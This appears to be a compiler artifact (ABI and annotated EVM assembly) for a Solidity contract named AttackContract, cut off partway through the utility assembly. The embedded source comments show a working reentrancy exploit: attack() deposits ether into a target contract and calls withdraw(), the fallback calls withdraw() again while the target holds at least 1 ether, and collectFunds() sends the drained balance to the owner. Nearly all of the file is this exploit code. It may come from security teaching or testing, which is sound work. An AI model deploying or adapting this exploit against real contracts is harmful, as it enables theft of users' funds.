{
	"contracts/AttackContract.sol": {
		"AttackContract": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_vulnerableAddress",
							"type": "address"
						}
					],
					"stateMutability": "payable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "address",
							"name": "attacker",
							"type": "address"
						}
					],
					"name": "AttackStarted",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "attacker",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "string",
							"name": "message",
							"type": "string"
						}
					],
					"name": "AttackStep",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "address",
							"name": "collector",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "FundsCollected",
					"type": "event"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "collectFunds",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "vulnerableContract",
					"outputs": [
						{
							"internalType": "contract IVulnerableContract",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/AttackContract.sol\":167:1509  contract AttackContract {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/AttackContract.sol\":470:623  constructor(address _vulnerableAddress) payable {... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"contracts/AttackContract.sol\":569:587  _vulnerableAddress */\n  dup1\n    /* \"contracts/AttackContract.sol\":528:546  vulnerableContract */\n  0x00\n  dup1\n    /* \"contracts/AttackContract.sol\":528:588  vulnerableContract = IVulnerableContract(_vulnerableAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/AttackContract.sol\":606:616  msg.sender */\n  caller\n    /* \"contracts/AttackContract.sol\":598:603  owner */\n  0x01\n  0x00\n    /* \"contracts/AttackContract.sol\":598:616  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/AttackContract.sol\":470:623  constructor(address _vulnerableAddress) payable {... */\n  pop\n    /* \"contracts/AttackContract.sol\":167:1509  contract AttackContract {... */\n  jump(tag_5)\n    /* \"#utility.yul\":88:205   */\ntag_7:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_9:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_10:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_19\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_9\n  jump\t// in\ntag_19:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_11:\n    /* \"#utility.yul\":641:665   */\n  tag_21\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_22\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_22:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_12:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_24\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_11\n  jump\t// in\ntag_24:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_2:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_26\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_27\n  tag_7\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":932:1051   */\ntag_26:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_28\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_12\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/AttackContract.sol\":167:1509  contract AttackContract {... */\ntag_5:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/AttackContract.sol\":167:1509  contract AttackContract {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x144166ae\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x5b980628\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n        /* \"contracts/AttackContract.sol\":683:693  msg.sender */\n      caller\n        /* \"contracts/AttackContract.sol\":672:716  AttackStep(msg.sender, \"Fallback triggered\") */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x16b30085abcb26f55a35299592de22f97112dc376a3a7d9245b530b4e76a1021\n      mload(0x40)\n      tag_9\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log2\n        /* \"contracts/AttackContract.sol\":769:776  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/AttackContract.sol\":738:756  vulnerableContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackContract.sol\":730:765  address(vulnerableContract).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contracts/AttackContract.sol\":730:776  address(vulnerableContract).balance >= 1 ether */\n      lt\n        /* \"contracts/AttackContract.sol\":726:832  if (address(vulnerableContract).balance >= 1 ether) {... */\n      tag_11\n      jumpi\n        /* \"contracts/AttackContract.sol\":792:810  vulnerableContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackContract.sol\":792:819  vulnerableContract.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/AttackContract.sol\":792:821  vulnerableContract.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_14:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/AttackContract.sol\":726:832  if (address(vulnerableContract).balance >= 1 ether) {... */\n    tag_11:\n        /* \"contracts/AttackContract.sol\":167:1509  contract AttackContract {... */\n      stop\n        /* \"contracts/AttackContract.sol\":197:242  IVulnerableContract public vulnerableContract */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      pop\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/AttackContract.sol\":1191:1507  function collectFunds() external {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      stop\n        /* \"contracts/AttackContract.sol\":248:268  address public owner */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_23\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_23:\n      pop\n      tag_24\n      tag_25\n      jump\t// in\n    tag_24:\n      mload(0x40)\n      tag_26\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_26:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/AttackContract.sol\":844:1185  function attack() public payable {... */\n    tag_6:\n      tag_28\n      tag_29\n      jump\t// in\n    tag_28:\n      stop\n        /* \"contracts/AttackContract.sol\":197:242  IVulnerableContract public vulnerableContract */\n    tag_17:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/AttackContract.sol\":1191:1507  function collectFunds() external {... */\n    tag_22:\n        /* \"contracts/AttackContract.sol\":1256:1261  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackContract.sol\":1242:1261  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackContract.sol\":1242:1252  msg.sender */\n      caller\n        /* \"contracts/AttackContract.sol\":1242:1261  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/AttackContract.sol\":1234:1276  require(msg.sender == owner, \"Not owner!\") */\n      tag_31\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_32\n      swap1\n      tag_33\n      jump\t// in\n    tag_32:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_31:\n        /* \"contracts/AttackContract.sol\":1286:1301  uint256 balance */\n      0x00\n        /* \"contracts/AttackContract.sol\":1304:1325  address(this).balance */\n      selfbalance\n        /* \"contracts/AttackContract.sol\":1286:1325  uint256 balance = address(this).balance */\n      swap1\n      pop\n        /* \"contracts/AttackContract.sol\":1336:1345  bool sent */\n      0x00\n        /* \"contracts/AttackContract.sol\":1351:1356  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackContract.sol\":1351:1361  owner.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackContract.sol\":1369:1376  balance */\n      dup3\n        /* \"contracts/AttackContract.sol\":1351:1381  owner.call{value: balance}(\"\") */\n      mload(0x40)\n      tag_34\n      swap1\n      tag_35\n      jump\t// in\n    tag_34:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_38\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_37)\n    tag_38:\n      0x60\n      swap2\n      pop\n    tag_37:\n      pop\n        /* \"contracts/AttackContract.sol\":1335:1381  (bool sent, ) = owner.call{value: balance}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"contracts/AttackContract.sol\":1396:1400  sent */\n      dup1\n        /* \"contracts/AttackContract.sol\":1391:1456  if (!sent) {... */\n      tag_39\n      jumpi\n        /* \"contracts/AttackContract.sol\":1416:1445  revert(\"Transaction Failed!\") */\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_40\n      swap1\n      tag_41\n      jump\t// in\n    tag_40:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n        /* \"contracts/AttackContract.sol\":1391:1456  if (!sent) {... */\n    tag_39:\n        /* \"contracts/AttackContract.sol\":1470:1500  FundsCollected(owner, balance) */\n      0x067e335270006737485da9eba56ed0753a5339fffc5dc1b53ea849447c98db54\n        /* \"contracts/AttackContract.sol\":1485:1490  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackContract.sol\":1492:1499  balance */\n      dup4\n        /* \"contracts/AttackContract.sol\":1470:1500  FundsCollected(owner, balance) */\n      mload(0x40)\n      tag_42\n      swap3\n      swap2\n      swap1\n      tag_43\n      jump\t// in\n    tag_42:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/AttackContract.sol\":1224:1507  {... */\n      pop\n      pop\n        /* \"contracts/AttackContract.sol\":1191:1507  function collectFunds() external {... */\n      jump\t// out\n        /* \"contracts/AttackContract.sol\":248:268  address public owner */\n    tag_25:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/AttackContract.sol\":844:1185  function attack() public payable {... */\n    tag_29:\n        /* \"contracts/AttackContract.sol\":909:914  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackContract.sol\":895:914  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackContract.sol\":895:905  msg.sender */\n      caller\n        /* \"contracts/AttackContract.sol\":895:914  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/AttackContract.sol\":887:929  require(msg.sender == owner, \"Not owner!\") */\n      tag_45\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_46\n      swap1\n      tag_33\n      jump\t// in\n    tag_46:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_45:\n        /* \"contracts/AttackContract.sol\":944:969  AttackStarted(msg.sender) */\n      0xce47de3ada8bbc7bfa5119dcccfa33a2a79fc932531d5ece6a80a32547f0b7a3\n        /* \"contracts/AttackContract.sol\":958:968  msg.sender */\n      caller\n        /* \"contracts/AttackContract.sol\":944:969  AttackStarted(msg.sender) */\n      mload(0x40)\n      tag_47\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_47:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/AttackContract.sol\":979:997  vulnerableContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackContract.sol\":979:1005  vulnerableContract.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"contracts/AttackContract.sol\":1013:1022  msg.value */\n      callvalue\n        /* \"contracts/AttackContract.sol\":979:1025  vulnerableContract.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_48:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_50\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_50:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/AttackContract.sol\":1051:1061  msg.sender */\n      caller\n        /* \"contracts/AttackContract.sol\":1040:1083  AttackStep(msg.sender, \"Deposit completed\") */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x16b30085abcb26f55a35299592de22f97112dc376a3a7d9245b530b4e76a1021\n      mload(0x40)\n      tag_51\n      swap1\n      tag_52\n      jump\t// in\n    tag_51:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log2\n        /* \"contracts/AttackContract.sol\":1093:1111  vulnerableContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackContract.sol\":1093:1120  vulnerableContract.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/AttackContract.sol\":1093:1122  vulnerableContract.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_53\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_53:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_55\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_55:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/AttackContract.sol\":1148:1158  msg.sender */\n      caller\n        /* \"contracts/AttackContract.sol\":1137:1178  AttackStep(msg.sender, \"Withdraw called\") */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x16b30085abcb26f55a35299592de22f97112dc376a3a7d9245b530b4e76a1021\n      mload(0x40)\n      tag_56\n      swap1\n      tag_57\n      jump\t// in\n    tag_56:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log2\n        /* \"contracts/AttackContract.sol\":844:1185  function attack() public payable {... */\n      jump\t// out\n        /* \"#utility.yul\":7:176   */\n    tag_58:\n        /* \"#utility.yul\":91:102   */\n      0x00\n        /* \"#utility.yul\":125:131   */\n      dup3\n        /* \"#utility.yul\":120:123   */\n      dup3\n        /* \"#utility.yul\":113:132   */\n      mstore\n        /* \"#utility.yul\":165:169   */\n      0x20\n        /* \"#utility.yul\":160:163   */\n      dup3\n        /* \"#utility.yul\":156:170   */\n      add\n        /* \"#utility.yul\":141:170   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:176   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":182:350   */\n    tag_59:\n        /* \"#utility.yul\":322:342   */\n      0x46616c6c6261636b207472696767657265640000000000000000000000000000\n        /* \"#utility.yul\":318:319   */\n      0x00\n        /* \"#utility.yul\":310:316   */\n      dup3\n        /* \"#utility.yul\":306:320   */\n      add\n        /* \"#utility.yul\":299:343   */\n      mstore\n        /* \"#utility.yul\":182:350   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":356:722   */\n    tag_60:\n        /* \"#utility.yul\":498:501   */\n      0x00\n        /* \"#utility.yul\":519:586   */\n      tag_86\n        /* \"#utility.yul\":583:585   */\n      0x12\n        /* \"#utility.yul\":578:581   */\n      dup4\n        /* \"#utility.yul\":519:586   */\n      tag_58\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":512:586   */\n      swap2\n      pop\n        /* \"#utility.yul\":595:688   */\n      tag_87\n        /* \"#utility.yul\":684:687   */\n      dup3\n        /* \"#utility.yul\":595:688   */\n      tag_59\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":713:715   */\n      0x20\n        /* \"#utility.yul\":708:711   */\n      dup3\n        /* \"#utility.yul\":704:716   */\n      add\n        /* \"#utility.yul\":697:716   */\n      swap1\n      pop\n        /* \"#utility.yul\":356:722   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":728:1147   */\n    tag_10:\n        /* \"#utility.yul\":894:898   */\n      0x00\n        /* \"#utility.yul\":932:934   */\n      0x20\n        /* \"#utility.yul\":921:930   */\n      dup3\n        /* \"#utility.yul\":917:935   */\n      add\n        /* \"#utility.yul\":909:935   */\n      swap1\n      pop\n        /* \"#utility.yul\":981:990   */\n      dup2\n        /* \"#utility.yul\":975:979   */\n      dup2\n        /* \"#utility.yul\":971:991   */\n      sub\n        /* \"#utility.yul\":967:968   */\n      0x00\n        /* \"#utility.yul\":956:965   */\n      dup4\n        /* \"#utility.yul\":952:969   */\n      add\n        /* \"#utility.yul\":945:992   */\n      mstore\n        /* \"#utility.yul\":1009:1140   */\n      tag_89\n        /* \"#utility.yul\":1135:1139   */\n      dup2\n        /* \"#utility.yul\":1009:1140   */\n      tag_60\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":1001:1140   */\n      swap1\n      pop\n        /* \"#utility.yul\":728:1147   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1153:1279   */\n    tag_61:\n        /* \"#utility.yul\":1190:1197   */\n      0x00\n        /* \"#utility.yul\":1230:1272   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1223:1228   */\n      dup3\n        /* \"#utility.yul\":1219:1273   */\n      and\n        /* \"#utility.yul\":1208:1273   */\n      swap1\n      pop\n        /* \"#utility.yul\":1153:1279   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1285:1345   */\n    tag_62:\n        /* \"#utility.yul\":1313:1316   */\n      0x00\n        /* \"#utility.yul\":1334:1339   */\n      dup2\n        /* \"#utility.yul\":1327:1339   */\n      swap1\n      pop\n        /* \"#utility.yul\":1285:1345   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1351:1493   */\n    tag_63:\n        /* \"#utility.yul\":1401:1410   */\n      0x00\n        /* \"#utility.yul\":1434:1487   */\n      tag_93\n        /* \"#utility.yul\":1452:1486   */\n      tag_94\n        /* \"#utility.yul\":1461:1485   */\n      tag_95\n        /* \"#utility.yul\":1479:1484   */\n      dup5\n        /* \"#utility.yul\":1461:1485   */\n      tag_61\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":1452:1486   */\n      tag_62\n      jump\t// in\n    tag_94:\n        /* \"#utility.yul\":1434:1487   */\n      tag_61\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":1421:1487   */\n      swap1\n      pop\n        /* \"#utility.yul\":1351:1493   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1499:1625   */\n    tag_64:\n        /* \"#utility.yul\":1549:1558   */\n      0x00\n        /* \"#utility.yul\":1582:1619   */\n      tag_97\n        /* \"#utility.yul\":1613:1618   */\n      dup3\n        /* \"#utility.yul\":1582:1619   */\n      tag_63\n      jump\t// in\n    tag_97:\n        /* \"#utility.yul\":1569:1619   */\n      swap1\n      pop\n        /* \"#utility.yul\":1499:1625   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1631:1782   */\n    tag_65:\n        /* \"#utility.yul\":1706:1715   */\n      0x00\n        /* \"#utility.yul\":1739:1776   */\n      tag_99\n        /* \"#utility.yul\":1770:1775   */\n      dup3\n        /* \"#utility.yul\":1739:1776   */\n      tag_64\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":1726:1776   */\n      swap1\n      pop\n        /* \"#utility.yul\":1631:1782   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1788:1969   */\n    tag_66:\n        /* \"#utility.yul\":1900:1962   */\n      tag_101\n        /* \"#utility.yul\":1956:1961   */\n      dup2\n        /* \"#utility.yul\":1900:1962   */\n      tag_65\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":1895:1898   */\n      dup3\n        /* \"#utility.yul\":1888:1963   */\n      mstore\n        /* \"#utility.yul\":1788:1969   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1975:2247   */\n    tag_19:\n        /* \"#utility.yul\":2093:2097   */\n      0x00\n        /* \"#utility.yul\":2131:2133   */\n      0x20\n        /* \"#utility.yul\":2120:2129   */\n      dup3\n        /* \"#utility.yul\":2116:2134   */\n      add\n        /* \"#utility.yul\":2108:2134   */\n      swap1\n      pop\n        /* \"#utility.yul\":2144:2240   */\n      tag_103\n        /* \"#utility.yul\":2237:2238   */\n      0x00\n        /* \"#utility.yul\":2226:2235   */\n      dup4\n        /* \"#utility.yul\":2222:2239   */\n      add\n        /* \"#utility.yul\":2213:2219   */\n      dup5\n        /* \"#utility.yul\":2144:2240   */\n      tag_66\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":1975:2247   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2253:2349   */\n    tag_67:\n        /* \"#utility.yul\":2290:2297   */\n      0x00\n        /* \"#utility.yul\":2319:2343   */\n      tag_105\n        /* \"#utility.yul\":2337:2342   */\n      dup3\n        /* \"#utility.yul\":2319:2343   */\n      tag_61\n      jump\t// in\n    tag_105:\n        /* \"#utility.yul\":2308:2343   */\n      swap1\n      pop\n        /* \"#utility.yul\":2253:2349   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2355:2473   */\n    tag_68:\n        /* \"#utility.yul\":2442:2466   */\n      tag_107\n        /* \"#utility.yul\":2460:2465   */\n      dup2\n        /* \"#utility.yul\":2442:2466   */\n      tag_67\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":2437:2440   */\n      dup3\n        /* \"#utility.yul\":2430:2467   */\n      mstore\n        /* \"#utility.yul\":2355:2473   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2479:2701   */\n    tag_27:\n        /* \"#utility.yul\":2572:2576   */\n      0x00\n        /* \"#utility.yul\":2610:2612   */\n      0x20\n        /* \"#utility.yul\":2599:2608   */\n      dup3\n        /* \"#utility.yul\":2595:2613   */\n      add\n        /* \"#utility.yul\":2587:2613   */\n      swap1\n      pop\n        /* \"#utility.yul\":2623:2694   */\n      tag_109\n        /* \"#utility.yul\":2691:2692   */\n      0x00\n        /* \"#utility.yul\":2680:2689   */\n      dup4\n        /* \"#utility.yul\":2676:2693   */\n      add\n        /* \"#utility.yul\":2667:2673   */\n      dup5\n        /* \"#utility.yul\":2623:2694   */\n      tag_68\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":2479:2701   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2707:2867   */\n    tag_69:\n        /* \"#utility.yul\":2847:2859   */\n      